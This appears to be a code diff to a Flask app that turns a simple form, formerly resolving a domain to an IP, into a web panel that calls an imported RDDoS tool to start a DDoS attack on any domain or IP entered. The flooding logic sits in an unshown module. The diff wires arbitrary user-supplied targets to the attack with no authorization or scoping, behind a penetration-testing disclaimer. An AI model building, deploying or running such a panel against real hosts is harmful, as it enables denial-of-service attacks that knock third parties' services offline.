@@ -1,31 +1,32 @@
+# app.py
 from flask import Flask, render_template, request
+import subprocess
+from rddos_tool import RDDoS
 
 app = Flask(__name__)
+rddos = RDDoS()
 
-# Home page
 @app.route('/', methods=['GET', 'POST'])
 def home():
-    result = None  # Initialize result to avoid UnboundLocalError
+    result = None
     if request.method == 'POST':
-        # Handle user input
         option = request.form.get('option')
         if option == '1':
             domain = request.form.get('domain')
             try:
-                import socket
-                ip = socket.gethostbyname(domain)
-                result = f"Resolved IP for {domain}: {ip}"
+                rddos.start_ddos(domain)
+                result = f"DDoS attack started on {domain}"
             except Exception as e:
                 result = f"Error: {e}"
         elif option == '2':
             ip = request.form.get('ip')
-            result = f"You entered IP: {ip}"
+            try:
+                rddos.start_ddos(ip)
+                result = f"DDoS attack started on {ip}"
+            except Exception as e:
+                result = f"Error: {e}"
         elif option == '3':
-            result = """
-            RedDDoS Tool is an open source tool for penetration.
-            You can test networks/servers/any other devices with it.
-            Author of the program is not responsible for its usage.
-            """
+            result = rddos.about()
         elif option == '4':
             return "Exiting..."
     return render_template('index.html', result=result)
